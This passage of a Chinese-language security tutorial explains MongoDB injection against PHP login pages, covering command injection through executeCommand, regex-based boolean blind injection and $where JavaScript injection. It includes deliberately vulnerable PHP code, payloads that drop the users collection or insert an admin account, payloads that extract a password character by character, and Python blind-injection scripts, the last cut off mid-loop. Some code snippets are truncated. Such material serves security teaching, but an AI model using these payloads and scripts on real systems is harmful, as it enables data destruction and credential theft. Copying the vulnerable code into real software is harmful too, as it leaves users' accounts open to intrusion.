**使用 Command 方法造成的注入**
MongoDB Driver 一般都提供直接执行 Shell 命令的方法，这些方式一般是不推荐使用的，但难免有人为了实现一些复杂的查询去使用。在
MongoDB 的服务器端可以通过 `db.eval` 方法来执行 JavaScript 脚本，如我们可以定义一个 JavaScript 函数，然后通过
`db.eval` 在服务器端来运行。
但是在 PHP 官网中就已经友情提醒了不要这样使用：
     "print('Hello, $username!');"
    ] );
    $r = $m->executeCommand( 'dramio', $cmd );
    ?>
还有人喜欢用 Command 去实现 MongoDB 的 `distinct` 方法，如下：
     "db.users.distinct('username',{'username':'$username'})"
    ] );
    $result = $manager->executeCommand('test.users', $cmd)->toArray();
    $count = count($result);
    if ($count > 0) {
        foreach ($result as $user) {
            $user = ((array)$user);
            echo '====Login Success====';
            echo 'username:' . $user['username'] . '';
            echo 'password:' . $user['password'] . '';
        }
    }
    else{
        echo 'Login Failed';
    }
    ?>
这样都是很危险的，因为这个就相当于把 Mongo Shell 开放给了用户，如果此时构造下列 payload：
    username=1'});db.users.drop();db.user.find({'username':'1
    username=1'});db.users.insert({"username":"admin","password":123456"});db.users.find({'username':'1
则将改变原本的查询语句造成注入。如果当前应用连接数据库的权限恰好很高，我们能干的事情就更多了。
###  Nosql 盲注
**重言式布尔盲注**
当页面没有回显时，那么我们可以通过 `$regex` 等正则表达式来构造永真条件进行盲注， `$regex` 可以达到和传统 SQL 注入中
`substr()` 函数相同的功能。
我们用下面的代码演示：
  * index.php
     $username,
        'password' => $password
    ));
    $result = $manager->executeQuery('test.users', $query)->toArray();
    $count = count($result);
    if ($count > 0) {
        foreach ($result as $user) {
            $user = ((array)$user);
            echo '====Login Success====';
            echo 'username:' . $user['username'] . '';
            echo 'password:' . $user['password'] . '';
        }
    }
    else{
        echo 'Login Failed';
    }
    ?>
布尔盲注重点在于怎么逐个提取字符，如下所示，在已知一个用户名的情况下判断密码的长度：
    username=admin&password[$regex]=.{4}    // 登录成功
    username=admin&password[$regex]=.{5}    // 登录成功
    username=admin&password[$regex]=.{6}    // 登录成功
    username=admin&password[$regex]=.{7}    // 登录失败
    ......
在 `password[$regex]=.{6}` 时可以成功登录，但在 `password[$regex]=.{7}` 时登录失败，说明该 whoami
用户的密码长度为 7。
提交的数据进入 PHP 后的数据如下：
    array(
        'username' => 'admin',
        'password' => array('$regex' => '.{6}')
    )
进入 MongoDB 后执行的查询命令为：
    > db.users.find({'username':'admin', 'password':{$regex:'.{6}'}})
    { "_id" : ObjectId("60fa9c7b257f18542b68c4b8"), "username" : "admin", "password" : "123456" }
    > db.users.find({'username':'admin', 'password':{$regex:'.{7}'}})
    >
由于 whoami 用户的 password 长度为 6，所以查询条件 `{'username':'admin',
'password':{$regex:'.{6}'}}` 为真，便能成功登录，而 `{'username':'admin',
'password':{$regex:'.{7}'}}` 为假，自然也就登录不了。
知道 password 的长度之后我们便可以逐位提取 password 的字符了：
    username=admin&password[$regex]=1.{5}
    username=admin&password[$regex]=12.{4}
    username=admin&password[$regex]=123.{3}
    username=admin&password[$regex]=1234.{2}
    username=admin&password[$regex]=12345.*
    username=admin&password[$regex]=123456
    或
    username=admin&password[$regex]=^1
    username=admin&password[$regex]=^12
    username=admin&password[$regex]=^123
    username=admin&password[$regex]=^1234
    username=admin&password[$regex]=^12345
    username=admin&password[$regex]=^123456
下面给出一个 MongoDB 盲注脚本：
    import requests
    import string
    password = ''
    url = 'http://192.168.226.148/index.php'
    while True:
        for c in string.printable:
            if c not in ['*', '+', '.', '?', '|', '#', '&', '$']:
                # When the method is GET
                get_payload = '?username=admin&password[$regex]=^%s' % (password + c)
                # When the method is POST
                post_payload = {
                    "username": "admin",
                    "password[$regex]": '^' + password + c
                }
                # When the method is POST with JSON
                json_payload = """{"username":"admin", "password":{"$regex":"^%s"}}""" % (password + c)
                #headers = {'Content-Type': 'application/json'}
                #r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json
                r = requests.post(url=url, data=post_payload)
                if 'Login Success' in r.text:
                    print("[+] %s" % (password + c))
                    password += c
    # 输出如下: 
    # [+] 1
    # [+] 12
    # [+] 123
    # [+] 1234
    # [+] 12345
    # [+] 123456
**$where 操作符布尔盲注**
`$where` 操作符前面我们已经说到了，当页面没有数据会显时，我们也可以通过闭合 JavaScript 的代码构造盲注。这里要提一下，在 MongoDB
2.4 之前，通过 `$where` 操作符可以访问到 Mongo Shell 中的全局函数和属性，如
`db`，也就是说可以在自定义的函数里获取数据库的所有信息。
我们用下面的代码演示：
  * index.php
     "function() {if(this.username == '".$username."' && this.password == '".$password."') {return true;}}"
    ));
    $result = $manager->executeQuery('test.users', $query)->toArray();
    $count = count($result);
    if ($count>0) {
        foreach ($result as $user) {
            $user=(array)$user;
            echo '====Login Success====';
            echo 'username: '.$user['username']."";
            echo 'password: '.$user['password']."";
        }
    }
    else{
        echo 'Login Failed';
    }
    ?>
此时没有回显了，但我们可以通过 `$where` 操作符访问到全局属性 `db`，然后对这里面的数据进行盲注，比如：
    username='||db.version()[0]=='2'){return true;}else{return false;}if('&password=123456
发送 payload，进入 PHP 后的数据如下：
    array(
        '$where' => "
        function() {
            if(this.username == ''||db.version()[0]=='2'){
                return true;
            }else{
                return false;
            }
            if('' && this.password == '123456') {
                return true;
            }
        }
    ")
如果 `db.version()[0]=='2'` 匹配正确则返回 true，然后登录成功，反之返回 false
，登陆失败。我们根据这一布尔条件进行判断即可逐个注出数据。但是 MongoDB 2.4 之后我们便无法访问到 `db` 属性了。
初次之外，我们还可以通过 `substr` 方法将指定用户的密码匹配出来，比如我们知道存在一个 admin 用户，那么我们可以将这个 admin
用户的密码匹配出来：
    username=admin'%26%26this.password.substr(-1)=='6') {return true;}})//&password=1
    username=admin'%26%26this.password.substr(-2)=='56') {return true;}})//&password=1
    username=admin'%26%26this.password.substr(-3)=='456') {return true;}})//&password=1
    username=admin'%26%26this.password.substr(-4)=='3456') {return true;}})//&password=1
    username=admin'%26%26this.password.substr(-5)=='23456') {return true;}})//&password=1
    username=admin'%26%26this.password.substr(-6)=='123456') {return true;}})//&password=1
    # 最后得到密码为 123456
发送 payload 后进入 PHP 的数据如下：
    array(
        '$where' => "
        function() {
            if(this.username == 'admin' && this.password.substr(-1)=='6') {
                return true;
            }}//' && this.password == '123456') {return true;}
        }
    ")
下面给出一个盲注脚本：
    import requests
    url = "http://192.168.219.130/"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    strings = "abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()"
    res = ""
    for i in range(len(res)+1,30):
        if len(res) == i-1:
            for c in strings: